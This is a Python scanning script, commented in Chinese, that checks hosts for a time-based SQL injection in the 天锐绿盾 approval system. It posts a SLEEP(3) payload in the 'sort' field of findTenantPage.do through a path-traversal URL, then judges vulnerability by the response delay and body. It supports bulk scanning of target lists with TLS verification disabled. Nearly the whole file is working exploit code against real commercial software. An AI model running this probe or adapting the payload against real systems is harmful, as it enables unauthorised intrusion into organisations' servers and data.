#天锐绿盾审批系统findTenantPageSQL注入验证工具
import argparse
import textwrap
import time
import signal
from multiprocessing.dummy import Pool
import requests
from urllib.parse import urljoin

# 全局变量用于控制程序是否继续运行
running = True


def signal_handler(signal, frame):
    """处理键盘中断信号，实现优雅退出"""
    global running
    if running:
        print("\n[!] 收到停止信号，正在终止检测...")
        running = False
    else:
        print("\n[!] 强制退出！")
        exit(1)


# 注册信号处理器，捕获Ctrl+C
signal.signal(signal.SIGINT, signal_handler)


def check_url(url):
    """检测单个URL是否存在漏洞，需同时满足内容匹配和响应延时在3-4秒区间内"""
    # 如果程序已收到停止信号，则直接返回
    if not running:
        return

    # 拼接完整检测路径
    check_path = "/trwfe/service/.%2E/invoker/findTenantPage.do"
    full_url = urljoin(url, check_path)

    try:
        # 记录开始时间
        start_time = time.time()

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'close'
        }
        data = {'sort': '(SELECT 2005 FROM (SELECT(SLEEP(3)))IEWh)'}

        # 设置超时（大于4秒，确保能检测到完整区间）
        response = requests.post(
            full_url,
            timeout=10,
            verify=False,
            headers=headers,
            data=data
        )
        response.encoding = "utf-8"

        # 计算请求耗时（秒）
        elapsed_time = time.time() - start_time

        # 目标特征字符串
        target_content = '{"total":4,"rows":[{"id":"dlp","name":"DLP"},{"id":"ld","name":"绿盾"},{"id":"lp","name":"绿盘"},{"id":"nac","name":"NAC"}]}'
        content_match = (response.text.strip() == target_content)

        # 判断条件：内容匹配 并且 响应时间在3-4秒区间内
        time_in_range = 3 <= elapsed_time < 4
        if content_match and time_in_range:
            print(f"[+]存在漏洞(内容匹配且响应延时{elapsed_time:.2f}秒，在3-4秒区间内): {full_url}")
        else:
            # 显示不满足的原因
            reasons = []
            if not content_match:
                reasons.append("内容不匹配")
            if not time_in_range:
                reasons.append(f"响应时间不在3-4秒区间({elapsed_time:.2f}秒)")
            print(f"[-]不存在漏洞({', '.join(reasons)}): {full_url}")

    except requests.exceptions.Timeout:
        print(f"[!]请求超时: {full_url} (未满足内容匹配和时间区间条件)")
    except requests.exceptions.RequestException as e:
        print(f"[!]请求失败: {full_url}，错误: {str(e)}")
    except Exception as e:
        if running:  # 只在正常运行时显示错误
            print(f"[!]处理{full_url}时出错: {str(e)}")


def script():
    global running

    banner = """
        ___  _ _     ________  _ _     _____
        \  \/// \ /\/  __/\  \/// \ /\/  __/
         \  / | | |||  \   \  / | | |||  \  
         / /  | \_/||  /_  / /  | \_/||  /_ 
        /_/   \____/\____\/_/   \____/\____\                                
            """
    print(banner)
    print("提示：检测过程中按 Ctrl+C 可停止程序\n")

    parser = argparse.ArgumentParser(
        description="<天锐绿盾审批系统findTenantPage>SQL注入检测工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("示例：python3 green_shield_checker.py -u http://127.0.0.1")
    )
    parser.add_argument("-u", dest="url", help="请输入要检测的URL", type=str)
    parser.add_argument("-r", dest="file", help="批量检测URL（文件路径）", type=str)
    args = parser.parse_args()

    if not args.url and not args.file:
        parser.print_help()
        return

    # 单URL检测
    if args.url:
        if not args.url.startswith(("http://", "https://")):
            args.url = f"http://{args.url}"
        check_url(args.url)

    # 批量检测
    if args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                urls = []
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if not line.startswith(("http://", "https://")):
                        line = f"http://{line}"
                    urls.append(line)

            # 使用进程池进行批量检测
            with Pool(10) as pool:
                # 逐个处理URL，允许中间停止
                for url in urls:
                    if not running:
                        break
                    pool.apply_async(check_url, args=(url,))

                # 等待所有已提交的任务完成
                pool.close()
                pool.join()

        except FileNotFoundError:
            print(f"[!]文件不存在: {args.file}")
        except Exception as e:
            print(f"[!]批量处理错误: {str(e)}")

    if not running:
        print("\n[!] 程序已停止")


if __name__ == '__main__':
    requests.packages.urllib3.disable_warnings()
    script()
